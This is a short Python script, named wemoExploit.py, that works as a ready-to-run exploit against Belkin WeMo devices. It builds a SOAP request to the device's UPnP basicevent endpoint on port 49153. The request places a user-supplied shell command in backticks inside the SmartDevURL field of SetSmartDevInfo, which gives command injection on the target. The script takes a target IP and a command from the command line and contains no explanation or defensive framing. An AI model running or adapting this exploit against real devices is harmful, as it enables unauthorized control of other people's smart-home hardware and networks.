wemoExploit.py

import sys
import requests

def exploitData(command):
    data = '''<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:SetSmartDevInfo xmlns:u="urn:Belkin:service:basicevent:1">
<SmartDevURL>`''' + command + '''`</SmartDevURL>
</u:SetSmartDevInfo>
</s:Body>
</s:Envelope>'''
    return data;


def run(command, targetIp, targetPort=49153):
    targeturl = 'http://' + targetIp + ':' + str(targetPort) + '/upnp/control/basicevent1'

    headers = {'Accept': '',
               'Content-type': 'text/xml; charset="utf-8"',
               'SOAPACTION': '"urn:Belkin:service:basicevent:1#SetSmartDevInfo"'}

    req = requests.post(targeturl, data=exploitData(command), headers=headers)
    print("UPNP request sent... status: " + str(req.status_code))
    return 0

def main():
    if len(sys.argv) < 3:
        print("usage: wemoExploit <target ip address> <command>")
        exit(1)

    targetIp = sys.argv[1];
    command = sys.argv[2];

    run(command,targetIp)

if __name__ == '__main__':
    main()